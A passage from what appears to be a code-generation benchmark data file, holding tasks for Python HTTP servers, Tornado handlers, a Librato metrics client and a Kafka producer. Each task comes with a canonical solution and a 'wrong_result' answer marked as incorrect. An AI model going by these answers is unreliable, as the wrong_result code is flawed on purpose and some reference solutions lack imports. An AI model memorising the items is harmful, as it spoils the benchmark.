    "wrong_result": "import http.server\nimport socketserver\nimport hashlib\nimport json\n\nclass XUDResolver:\n    def __init__(self, host: str = \"localhost\", port: int = 8000) -> None:\n        self.host = host\n        self.port = port\n        self.x_secret = \"your_predefined_secret_in_hex\"\n        self.x_secret_hash = hashlib.sha256(bytes.fromhex(self.x_secret)).hexdigest()\n\n    def resolve(self, request: dict) -> dict or None:\n        secrethash = request.get(\"secrethash\")\n        if secrethash == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    def serve(self) -> None:\n        class RequestHandler(http.server.SimpleHTTPRequestHandler):\n            def do_POST(self):\n                content_length = int(self.headers['Content-Length'])\n                post_data = self.rfile.read(content_length)\n                request = json.loads(post_data.decode('utf-8'))\n                resolver = XUDResolver()\n                response = resolver.resolve(request)\n                if response:\n                    self.send_response(200)\n                    self.send_header('Content-type', 'application/json')\n                    self.end_headers()\n                    self.wfile.write(json.dumps(response).encode('utf-8'))\n                else:\n                    self.send_response(404)\n                    self.end_headers()\n\n        with socketserver.TCPServer((self.host, self.port), RequestHandler) as httpd:\n            print(f\"Serving at {self.host}:{self.port}\")\n            httpd.serve_forever()\n\n# Example usage:\n# resolver = XUDResolver()\n# resolver.serve()"
  },
  {
    "Task_id": 227,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server to serve static files and render dynamic content from a profile file, with optional browser auto-launch functionality.\n\nClass Description: ProfileHTTPServer is a class that creates and manages an HTTP server to serve both static files from a 'web' directory and dynamically rendered content from profile data. It handles port selection, profile data reading, and optional browser launching.\n\nAttributes:\nprof_filename: str - The filename of the profile to be read and served\nstart_browser: bool - Flag indicating whether to automatically open a browser tab\nport: Optional[int] - The port number to use for the server (None for auto-selection)\ndata: Any - The profile data read from the file\n\nMethods:\n__init__(prof_filename: str, start_browser: bool = False, port: Optional[int] = None) -> None - Initializes the server with profile filename, browser flag, and optional port\n_read_profile() -> Any - Reads and returns profile data from the specified file\n_is_port_in_use(port: int) -> bool - Checks if a port is already in use\nstart() -> None - Starts the HTTP server on the selected port, optionally launching a browser\n\nStaticServer (nested class):\n__init__(data: Any, prof_filename: str, *args, **kwargs) -> None - Initializes the request handler with profile data and filename\ndo_GET() -> None - Handles GET requests, serving either static files or rendered HTML\n_render() -> str - Renders the HTML template with profile data and version information",
    "Canonical_solution": "import html\nimport json\nimport mimetypes\nimport socket\nimport threading\nimport webbrowser\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom pathlib import Path\nfrom typing import Optional\n\nclass StaticServer(BaseHTTPRequestHandler):\n    def __init__(self, data, prof_filename, *args, **kwargs):\n        self.data = data\n        self.prof_filename = prof_filename\n        super().__init__(*args, **kwargs)\n\n    def do_GET(self):\n        self.send_response(200)\n\n        if self.path == \"/\":\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(self._render().encode())\n        else:\n            this_dir = Path(__file__).resolve().parent\n            filepath = this_dir / \"web\" / self.path[1:]\n\n            mimetype, _ = mimetypes.guess_type(str(filepath))\n            assert mimetype is not None\n            self.send_header(\"Content-type\", mimetype)\n            self.end_headers()\n\n            with open(filepath, \"rb\") as fh:\n                content = fh.read()\n            self.wfile.write(content)\n\n    def _render(self):\n        this_dir = Path(__file__).resolve().parent\n        with open(this_dir / \"web\" / \"index.html\", encoding=\"utf-8\") as _file:\n            template = string.Template(_file.read())\n\n        return template.substitute(\n            data=html.escape(json.dumps(self.data).replace(\"</\", \"<\\\\/\")),\n            version=html.escape(__version__),\n            filename=html.escape(self.prof_filename.replace(\"</\", \"<\\\\/\")),\n        )\n\nclass ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: Optional[int] = None):\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self):\n        try:\n            return read_import_profile(self.prof_filename)\n        except (TunaError, StopIteration):\n            pass\n        return read_runtime_profile(self.prof_filename)\n\n    def _is_port_in_use(self, port: int) -> bool:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            return s.connect_ex((\"localhost\", port)) == 0\n\n    def start(self):\n        if self.port is None:\n            self.port = 8000\n            while self._is_port_in_use(self.port):\n                self.port += 1\n\n        handler = lambda *args: StaticServer(self.data, self.prof_filename, *args)\n        httpd = HTTPServer((\"\", self.port), handler)\n\n        if self.start_browser:\n            address = f\"http://localhost:{self.port}\"\n            threading.Thread(target=lambda: webbrowser.open_new_tab(address)).start()\n\n        print(f\"Starting httpd on port {self.port}\")\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport os\nimport webbrowser\nimport json\nfrom typing import Any, Optional\n\nclass ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: Optional[int] = None) -> None:\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self) -> Any:\n        with open(self.prof_filename, 'r') as file:\n            return json.load(file)\n\n    def _is_port_in_use(self, port: int) -> bool:\n        with socketserver.TCPServer((\"\", port), None) as server:\n            return False\n\n    def start(self) -> None:\n        if self.port is None:\n            self.port = 8000\n            while self._is_port_in_use(self.port):\n                self.port += 1\n\n        with socketserver.TCPServer((\"\", self.port), self.StaticServer) as httpd:\n            print(f\"Serving at port {self.port}\")\n            if self.start_browser:\n                webbrowser.open(f\"http://localhost:{self.port}/profile.html\")\n            httpd.serve_forever()\n\n    class StaticServer(http.server.SimpleHTTPRequestHandler):\n        def __init__(self, data: Any, prof_filename: str, *args, **kwargs) -> None:\n            self.data = data\n            self.prof_filename = prof_filename\n            super().__init__(*args, directory='web', **kwargs)\n\n        def do_GET(self) -> None:\n            if self.path == '/profile.html':\n                self.send_response(200)\n                self.send_header('Content-type', 'text/html')\n                self.end_headers()\n                self.wfile.write(self._render().encode())\n            else:\n                super().do_GET()\n\n        def _render(self) -> str:\n            with open('templates/profile.html', 'r') as file:\n                template = file.read()\n            rendered = template.replace(\"{{profile_data}}\", json.dumps(self.data))\n            rendered = rendered.replace(\"{{version}}\", \"1.0.0\")  # Example version\n            return rendered\n\n# Example usage:\n# server = ProfileHTTPServer('profile.json', start_browser=True)\n# server.start()\n```"
  },
  {
    "Task_id": 229,
    "Instruction": "Task Description: Create a simple HTTP server in Python that can handle GET, HEAD, and POST requests, with customizable port configuration.\n\nClass Description: SimpleHTTPServer is a class that implements a basic HTTP server capable of processing GET, HEAD, and POST requests. It includes an inner RequestHandler class that manages the actual request processing and response generation.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8080)\n- server_address: tuple - A tuple containing the server address and port (default: ('', port))\n- handler_class: class - The request handler class that processes HTTP requests\n\nMethods:\n- __init__(port: int = 8080) -> None - Initializes the server with the specified port\n- run() -> None - Starts the HTTP server and begins serving requests indefinitely\n- RequestHandler._set_headers() -> None - Sets basic HTTP response headers (200 status and text/html content type)\n- RequestHandler.do_GET() -> None - Handles HTTP GET requests\n- RequestHandler.do_HEAD() -> None - Handles HTTP HEAD requests\n- RequestHandler.do_POST() -> None - Handles HTTP POST requests, reading and printing the posted data",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass SimpleHTTPServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.server_address = ('', self.port)\n        self.handler_class = self.RequestHandler\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_GET(self):\n            self._set_headers()\n\n        def do_HEAD(self):\n            self._set_headers()\n\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            self._set_headers()\n            print(post_data)\n\n    def run(self):\n        httpd = HTTPServer(self.server_address, self.handler_class)\n        print('Starting httpd...')\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass SimpleHTTPServer:\n    def __init__(self, port: int = 8080) -> None:\n        self.port = port\n        self.server_address = ('', port)\n        self.handler_class = self.RequestHandler\n\n    def run(self) -> None:\n        httpd = HTTPServer(self.server_address, self.handler_class)\n        print(f\"Starting httpd server on port {self.port}\")\n        httpd.serve_forever()\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def _set_headers(self) -> None:\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_GET(self) -> None:\n            self._set_headers()\n            self.wfile.write(b\"<html><body><h1>GET request received</h1></body></html>\")\n\n        def do_HEAD(self) -> None:\n            self._set_headers()\n\n        def do_POST(self) -> None:\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            print(f\"Received POST request with data: {post_data.decode('utf-8')}\")\n            self._set_headers()\n            self.wfile.write(b\"<html><body><h1>POST request received</h1></body></html>\")\n\n# Example usage:\n# server = SimpleHTTPServer(port=8000)\n# server.run()\n```"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a mock HTTP server for testing purposes that can handle various types of requests (GET, POST) and responses (JSON, redirects, status codes).\n\nClass Description: MockServer is a context manager class that creates and manages a lightweight HTTP server in a separate thread for testing HTTP client functionality. It provides endpoints for testing different HTTP scenarios.\n\nAttributes:\n- httpd: [HTTPServer] - The HTTP server instance\n- address: [str] - The server's IP address (127.0.0.1)\n- port: [int] - The dynamically assigned port number\n- thread: [Thread] - The thread running the server\n\nMethods:\n- __enter__() -> [MockServer] - Starts the server in a new thread when entering the context\n- __exit__(exc_type, exc_value, traceback) -> [None] - Shuts down the server and cleans up when exiting the context\n- urljoin(url: Optional[str]) -> [str] - Constructs a full URL by joining the base server URL with an optional path\n\nNested Class: _RequestHandler (BaseHTTPRequestHandler) - Handles incoming HTTP requests\n\nMethods:\n- do_POST() -> [None] - Handles POST requests by echoing back the request body\n- do_GET() -> [None] - Handles GET requests with various endpoints:\n  * /headers - Returns request headers as JSON\n  * /status/204 - Returns empty 204 response\n  * /redirect - Chain of redirect responses\n  * Default - Returns 404 for unknown paths\n- _send_json(body: dict, status: int = 200) -> [None] - Helper method to send JSON responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom threading import Thread\nfrom urllib.parse import urljoin\nfrom typing import Optional\n\nclass _RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self) -> None:\n        content_length = int(self.headers.get(\"Content-Length\") or 0)\n        body_bytes = b\"Request body: \" + self.rfile.read(content_length)\n        self.send_response(200)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\n    def do_GET(self) -> None:\n        if self.path == \"/headers\":\n            self._send_json(dict(self.headers))\n        elif self.path == \"/status/204\":\n            self.send_response(204)\n            self.end_headers()\n        elif self.path == \"/redirect2\":\n            self.send_response(302)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/redirect\")\n            self.end_headers()\n        elif self.path == \"/redirect\":\n            self.send_response(301)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/headers\")\n            self.end_headers()\n        else:\n            self._send_json({\"error\": \"unknown path\"}, status=404)\n\n    def _send_json(self, body: dict, status: int = 200) -> None:\n        body_bytes = json.dumps(body, indent=2).encode(\"utf8\")\n        self.send_response(status)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\nclass MockServer:\n    def __enter__(self):\n        self.httpd = HTTPServer((\"127.0.0.1\", 0), _RequestHandler)\n        self.address, self.port = self.httpd.server_address\n        self.thread = Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.httpd.shutdown()\n        self.thread.join()\n\n    def urljoin(self, url: Optional[str] = None) -> str:\n        return urljoin(f\"http://{self.address}:{self.port}\", url)",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom threading import Thread\nfrom urllib.parse import urlparse, urlunparse\n\nclass MockServer:\n    def __init__(self):\n        self.httpd = None\n        self.address = '127.0.0.1'\n        self.port = 0\n        self.thread = None\n\n    def __enter__(self):\n        self.httpd = HTTPServer((self.address, self.port), self._RequestHandler)\n        self.port = self.httpd.server_address[1]\n        self.thread = Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.httpd.shutdown()\n        self.httpd.server_close()\n        self.thread.join()\n\n    def urljoin(self, url=None):\n        netloc = f\"{self.address}:{self.port}\"\n        if url:\n            parsed_url = urlparse(url)\n            return urlunparse((parsed_url.scheme, netloc, parsed_url.path, parsed_url.params, parsed_url.query, parsed_url.fragment))\n        return f\"http://{netloc}\"\n\n    class _RequestHandler(BaseHTTPRequestHandler):\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(post_data)\n\n        def do_GET(self):\n            if self.path == '/headers':\n                self._send_json(dict(self.headers))\n            elif self.path.startswith('/status/'):\n                status_code = int(self.path.split('/')[-1])\n                self.send_response(status_code)\n                self.end_headers()\n            elif self.path == '/redirect':\n                self.send_response(302)\n                self.send_header('Location', self.urljoin('/redirect'))\n                self.end_headers()\n            else:\n                self.send_error(404, \"Not Found\")\n\n        def _send_json(self, body, status=200):\n            self.send_response(status)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps(body).encode('utf-8'))\n\n        @property\n        def urljoin(self):\n            return self.server.server_address[0], self.server.server_address[1]\n```"
  },
  {
    "Task_id": 235,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that serves coverage badge images based on project coverage data stored in files. The server should handle GET requests, read coverage data from files, and redirect to appropriate badge images based on coverage percentage.\n\nClass Description: CoverageBadgeServer is a Tornado web application that serves dynamic coverage badges. It initializes a web server that listens for requests and routes them to a handler that processes coverage data.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8888)\n- address: str - The IP address to bind the server to (default: '127.0.0.1')\n- application: tornado.web.Application - The Tornado web application instance\n\nMethods:\n- __init__(port: int = 8888, address: str = '127.0.0.1') -> None - Initializes the server with specified port and address, sets up URL routing\n- start() -> None - Starts the Tornado web server and begins listening for requests\n\nClass Description: MainHandler is a Tornado request handler that processes GET requests for coverage badges.\n\nMethods:\n- get(project: str) -> None - Handles GET requests:\n  - Input: project - The project name from the URL path\n  - Behavior:\n    1. Attempts to read coverage data from '/tmp/{project}-coverage' file\n    2. Determines badge color based on coverage percentage (\u226580% = green, <80% = yellow)\n    3. Redirects to appropriate shields.io badge URL\n    4. Returns 404 if coverage file not found\n  - Output: HTTP redirect to badge image or 404 error",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\nimport urllib\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self, project):\n        try:\n            with open('/tmp/%s-coverage' % project, 'rb') as f:\n                coverage = f.read().strip()\n                n = int(coverage.strip('%'))\n                if n >= 80:\n                    color = 'brightgreen'\n                else:\n                    color = 'yellow'\n                self.redirect(('https://img.shields.io/badge/'\n                               'coverage-%s-%s.svg'\n                               '?style=flat') %\n                              (urllib.quote(coverage), color))\n        except IOError:\n            raise tornado.web.HTTPError(404)\n\nclass CoverageBadgeServer:\n    def __init__(self, port=8888, address='127.0.0.1'):\n        self.port = port\n        self.address = address\n        self.application = tornado.web.Application([\n            (r\"/([a-zA-Z0-9\\-_]+)\", MainHandler),\n        ])\n\n    def start(self):\n        self.application.listen(self.port, address=self.address)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport os\n\nclass CoverageBadgeServer:\n    def __init__(self, port: int = 8888, address: str = '127.0.0.1') -> None:\n        self.port = port\n        self.address = address\n        self.application = tornado.web.Application([\n            (r\"/badge/([^/]+)\", MainHandler),\n        ])\n\n    def start(self) -> None:\n        self.application.listen(self.port, address=self.address)\n        tornado.ioloop.IOLoop.current().start()\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self, project: str) -> None:\n        coverage_file_path = f'/tmp/{project}-coverage'\n        if os.path.exists(coverage_file_path):\n            with open(coverage_file_path, 'r') as file:\n                coverage = float(file.read().strip())\n                if coverage >= 80:\n                    badge_color = 'green'\n                else:\n                    badge_color = 'yellow'\n                badge_url = f'https://img.shields.io/badge/coverage-{coverage:.2f}%-{badge_color}.svg'\n                self.redirect(badge_url)\n        else:\n            self.set_status(404)\n            self.finish(\"Coverage data not found\")\n\nif __name__ == \"__main__\":\n    server = CoverageBadgeServer()\n    server.start()\n```"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a function to send metric data to the Librato metrics service using HTTP POST requests with basic authentication.\n\nFunction Description: The function `count` sends a counter metric to Librato's API. It establishes an HTTPS connection to the metrics API server, sends the metric data as a URL-encoded form, and includes basic authentication headers. The function handles the case where authentication credentials are not configured by doing nothing.\n\nInput:\n- `name` (str): The name of the counter metric to be sent\n- `value` (int, optional): The value to increment the counter by (defaults to 1)\n\nOutput: None (The function doesn't return any value, but sends data to the external metrics service)",
    "Canonical_solution": "from ConfigParser import NoOptionError, NoSectionError\nimport base64\nimport httplib\nimport urllib\nfrom blueprint import cfg\n\ntry:\n    token = cfg.get('librato', 'token')\n    username = cfg.get('librato', 'username')\n    auth = 'Basic {0}'.format(base64.b64encode('{0}:{1}'.format(username,\n                                                                token)))\nexcept (NoOptionError, NoSectionError):\n    auth = None\n\ndef count(name, value=1):\n    if auth is None:\n        return\n    conn = httplib.HTTPSConnection('metrics-api.librato.com')\n    conn.request('POST',\n                 '/v1/counters/{0}.json'.format(urllib.quote(name)),\n                 urllib.urlencode({'value': value}),\n                 {'Authorization': auth,\n                  'Content-Type': 'application/x-www-form-urlencoded'})\n    r = conn.getresponse()\n    conn.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nfrom urllib.parse import urlencode\n\ndef count(name, value=1):\n    username = 'your_librato_username'\n    password = 'your_librato_password'\n    \n    if not username or not password:\n        return\n    \n    url = 'https://metrics-api.librato.com/v1/counters'\n    data = {'name': name, 'count': value}\n    headers = {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'Authorization': f'Basic {b64encode(f\"{username}:{password}\".encode()).decode()}'\n    }\n    \n    response = requests.post(url, data=urlencode(data), headers=headers)\n    \n    if response.status_code != 200:\n        print(f\"Failed to send metric to Librato: {response.status_code} - {response.text}\")\n```"
  },
  {
    "Task_id": 240,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the Tornado framework to handle backend requests and serve static content, with support for both HTTP and HTTPS connections.\n\nClass Description: The HTTPServer class initializes and runs a Tornado-based web server that can handle backend API requests and serve static files, with separate configurations for HTTP and HTTPS ports.\n\nAttributes:\n- ip: str - The IP address to bind the server to\n- port: int - The HTTP port number to listen on\n- ssl_port: int - The HTTPS port number to listen on\n- template: object - An object providing template paths for static content\n- em: object - An event manager object providing backend functionality\n\nMethods:\n- __init__(ip: str, port: int, ssl_port: int, template: object, em: object) -> None - Initializes the server with configuration parameters\n- run() -> None - Starts the HTTP and HTTPS servers and begins the I/O loop\n\nAdditional Class Descriptions:\n\nBackendHandler (extends tornado.web.RequestHandler):\n- Purpose: Handles POST requests to the backend API endpoint\nAttributes:\n- em: object - Event manager object providing backend methods\nMethods:\n- initialize(em: object) -> None - Initializes the handler with the event manager\n- post() -> None - Processes POST requests, executes backend methods, and returns JSON responses\n\nCaptivePortalHandler (mentioned but not shown in reference):\n- Purpose: Handles requests to the captive portal (implementation not shown)\n\nDowngradeToHTTP (mentioned but not shown in reference):\n- Purpose: Handles HTTPS requests by downgrading them to HTTP (implementation not shown)",
    "Canonical_solution": "import tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\nimport json\nfrom tornado.escape import json_decode, url_unescape\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em):\n        self.em = em\n\n    def post(self):\n        json_obj = json_decode(self.request.body)\n        response_to_send = {}\n        backend_methods = self.em.get_backend_funcs()\n        \n        for func_name in list(json_obj.keys()):\n            if func_name in backend_methods:\n                callback = getattr(backend_methods[func_name], func_name)\n                response_to_send[func_name] = callback(json_obj[func_name])\n            else:\n                response_to_send[func_name] = \"NotFound\"\n\n        self.write(json.dumps(response_to_send))\n\nclass HTTPServer:\n    def __init__(self, ip, port, ssl_port, template, em):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n    def run(self):\n        app = tornado.web.Application(\n            [\n                (r\"/backend/.*\", BackendHandler, {\"em\": self.em}),\n                (r\"/.*\", CaptivePortalHandler),\n            ],\n            template_path=self.template.get_path(),\n            static_path=self.template.get_path_static(),\n            compiled_template_cache=False,\n            ui_methods=uimethods)\n        app.listen(self.port, address=self.ip)\n\n        ssl_app = tornado.web.Application([(r\"/.*\", DowngradeToHTTP)], port=self.port)\n        https_server = tornado.httpserver.HTTPServer(\n            ssl_app,\n            ssl_options={\n                \"certfile\": constants.PEM,\n                \"keyfile\": constants.PEM,\n            })\n        https_server.listen(self.ssl_port, address=self.ip)\n\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport tornado.httpserver\nimport ssl\n\nclass HTTPServer:\n    def __init__(self, ip: str, port: int, ssl_port: int, template: object, em: object) -> None:\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n    def run(self) -> None:\n        http_server = tornado.httpserver.HTTPServer(self.create_app())\n        http_server.listen(self.port, self.ip)\n\n        ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n        ssl_ctx.load_cert_chain(\"path/to/cert.pem\", \"path/to/key.pem\")\n        https_server = tornado.httpserver.HTTPServer(self.create_app(), ssl_options=ssl_ctx)\n        https_server.listen(self.ssl_port, self.ip)\n\n        tornado.ioloop.IOLoop.current().start()\n\n    def create_app(self):\n        return tornado.web.Application([\n            (r\"/backend\", BackendHandler, dict(em=self.em)),\n            # Add other handlers here if needed\n        ])\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em: object) -> None:\n        self.em = em\n\n    def post(self) -> None:\n        data = self.request.body\n        response = self.em.process(data)\n        self.write(response)\n\n# Implement CaptivePortalHandler and DowngradeToHTTP as needed\n```\n\nThis code defines a basic structure for an HTTP server using Tornado that can handle both HTTP and HTTPS connections. The `HTTPServer` class initializes and starts the server, while the `BackendHandler` class processes POST requests to the backend API endpoint. Additional handlers like `CaptivePortalHandler` and `DowngradeToHTTP` should be implemented based on specific requirements."
  },
  {
    "Task_id": 259,
    "Instruction": "Task Description: Implement a KafkaProducer class in Python that can send messages to a Kafka cluster with configurable settings for serialization, partitioning, compression, and message delivery guarantees.\n\nClass Description: The KafkaProducer class is a high-level producer client that publishes messages to Kafka topics. It handles message serialization, partitioning, batching, and retries for failed requests. The producer is thread-safe and manages background threads for message accumulation and network I/O.\n\nAttributes:\n- config: [dict] - Configuration parameters for the producer including bootstrap servers, serializers, acks, etc.\n- _metrics: [Metrics] - Tracks producer performance metrics\n- _accumulator: [RecordAccumulator] - Batches messages by topic-partition before sending\n- _metadata: [ClusterMetadata] - Maintains cluster metadata including topic partitions\n- _sender: [Sender] - Background thread that sends batched messages to brokers\n- _closed: [bool] - Flag indicating if producer has been closed\n- _cleanup: [function] - Cleanup handler registered with atexit\n\nMethods:\n- __init__(**configs) -> None - Initializes the producer with given configuration overrides\n- send(topic, value=None, key=None, headers=None, partition=None, timestamp_ms=None) -> FutureRecordMetadata - Asynchronously sends a message to the specified topic and returns a future\n- flush(timeout=None) -> None - Ensures all buffered messages are delivered within timeout\n- close(timeout=None) -> None - Closes the producer and releases resources\n- _cleanup_factory() -> function - Creates cleanup function for atexit registration\n- _unregister_cleanup() -> None - Removes cleanup handler from atexit\n- _max_usable_produce_magic() -> int - Determines message format version based on API version\n- _estimate_size_in_bytes(key, value, headers=[]) -> int - Estimates serialized message size\n- _ensure_valid_record_size(size) -> None - Validates message size against configured limits\n- _wait_on_metadata(topic, max_wait) -> set - Waits for metadata update for given topic\n- _serialize(f, topic, data) -> bytes - Serializes message key/value using configured serializer\n- _partition(topic, partition, key, value, serialized_key, serialized_value) -> int - Determines target partition for message",
    "Canonical_solution": "import atexit\nimport copy\nimport logging\nimport socket\nimport threading\nimport time\nimport weakref\n\nfrom kafka.vendor import six\nimport kafka.errors as Errors\nfrom kafka.client_async import KafkaClient, selectors\nfrom kafka.codec import has_gzip, has_snappy, has_lz4, has_zstd\nfrom kafka.metrics import MetricConfig, Metrics\nfrom kafka.partitioner.default import DefaultPartitioner\nfrom kafka.producer.future import FutureRecordMetadata, FutureProduceResult\nfrom kafka.producer.record_accumulator import AtomicInteger, RecordAccumulator\nfrom kafka.producer.sender import Sender\nfrom kafka.record.default_records import DefaultRecordBatchBuilder\nfrom kafka.record.legacy_records import LegacyRecordBatchBuilder\nfrom kafka.serializer import Serializer\nfrom kafka.structs import TopicPartition\n\nlog = logging.getLogger(__name__)\nPRODUCER_CLIENT_ID_SEQUENCE = AtomicInteger()\n\nclass KafkaProducer:\n    DEFAULT_CONFIG = {\n        'bootstrap_servers': 'localhost',\n        'client_id': None,\n        'key_serializer': None,\n        'value_serializer': None,\n        'acks': 1,\n        'bootstrap_topics_filter': set(),\n        'compression_type': None,\n        'retries': 0,\n        'batch_size': 16384,\n        'linger_ms': 0,\n        'partitioner': DefaultPartitioner(),\n        'buffer_memory': 33554432,\n        'connections_max_idle_ms': 9 * 60 * 1000,\n        'max_block_ms': 60000,\n        'max_request_size': 1048576,\n        'metadata_max_age_ms': 300000,\n        'retry_backoff_ms': 100,\n        'request_timeout_ms': 30000,\n        'receive_buffer_bytes': None,\n        'send_buffer_bytes': None,\n        'socket_options': [(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)],\n        'sock_chunk_bytes': 4096,\n        'sock_chunk_buffer_count': 1000,\n        'reconnect_backoff_ms': 50,\n        'reconnect_backoff_max_ms': 1000,\n        'max_in_flight_requests_per_connection': 5,\n        'security_protocol': 'PLAINTEXT',\n        'ssl_context': None,\n        'ssl_check_hostname': True,\n        'ssl_cafile': None,\n        'ssl_certfile': None,\n        'ssl_keyfile': None,\n        'ssl_crlfile': None,\n        'ssl_password': None,\n        'ssl_ciphers': None,\n        'api_version': None,\n        'api_version_auto_timeout_ms': 2000,\n        'metric_reporters': [],\n        'metrics_num_samples': 2,\n        'metrics_sample_window_ms': 30000,\n        'selector': selectors.DefaultSelector,\n        'sasl_mechanism': None,\n        'sasl_plain_username': None,\n        'sasl_plain_password': None,\n        'sasl_kerberos_service_name': 'kafka',\n        'sasl_kerberos_domain_name': None,\n        'sasl_oauth_token_provider': None,\n        'kafka_client': KafkaClient,\n    }\n\n    _COMPRESSORS = {\n        'gzip': (has_gzip, LegacyRecordBatchBuilder.CODEC_GZIP),\n        'snappy': (has_snappy, LegacyRecordBatchBuilder.CODEC_SNAPPY),\n        'lz4': (has_lz4, LegacyRecordBatchBuilder.CODEC_LZ4),\n        'zstd': (has_zstd, DefaultRecordBatchBuilder.CODEC_ZSTD),\n        None: (lambda: True, LegacyRecordBatchBuilder.CODEC_NONE),\n    }\n\n    def __init__(self, **configs):\n        self.config = copy.copy(self.DEFAULT_CONFIG)\n        for key in self.config:\n            if key in configs:\n                self.config[key] = configs.pop(key)\n\n        if self.config['client_id'] is None:\n            self.config['client_id'] = 'kafka-python-producer-%s' % (PRODUCER_CLIENT_ID_SEQUENCE.increment(),)\n\n        if self.config['acks'] == 'all':\n            self.config['acks'] = -1\n\n        metrics_tags = {'client-id': self.config['client_id']}\n        metric_config = MetricConfig(samples=self.config['metrics_num_samples'],\n                                   time_window_ms=self.config['metrics_sample_window_ms'],\n                                   tags=metrics_tags)\n        reporters = [reporter() for reporter in self.config['metric_reporters']]\n        self._metrics = Metrics(metric_config, reporters)\n\n        client = self.config['kafka_client'](\n            metrics=self._metrics, metric_group_prefix='producer',\n            wakeup_timeout_ms=self.config['max_block_ms'],\n            **self.config)\n\n        if self.config['api_version'] is None:\n            self.config['api_version'] = client.config['api_version']\n\n        ct = self.config['compression_type']\n        if ct not in self._COMPRESSORS:\n            raise ValueError(\"Not supported codec: {}\".format(ct))\n        else:\n            checker, compression_attrs = self._COMPRESSORS[ct]\n            assert checker(), \"Libraries for {} compression codec not found\".format(ct)\n            self.config['compression_attrs'] = compression_attrs\n\n        message_version = self._max_usable_produce_magic()\n        self._accumulator = RecordAccumulator(message_version=message_version, metrics=self._metrics, **self.config)\n        self._metadata = client.cluster\n        guarantee_message_order = bool(self.config['max_in_flight_requests_per_connection'] == 1)\n        self._sender = Sender(client, self._metadata,\n                             self._accumulator, self._metrics,\n                             guarantee_message_order=guarantee_message_order,\n                             **self.config)\n        self._sender.daemon = True\n        self._sender.start()\n        self._closed = False\n\n        self._cleanup = self._cleanup_factory()\n        atexit.register(self._cleanup)\n\n    def send(self, topic, value=None, key=None, headers=None, partition=None, timestamp_ms=None):\n        assert value is not None or self.config['api_version'] >= (0, 8, 1), (\n            'Null messages require kafka >= 0.8.1')\n        assert not (value is None and key is None), 'Need at least one: key 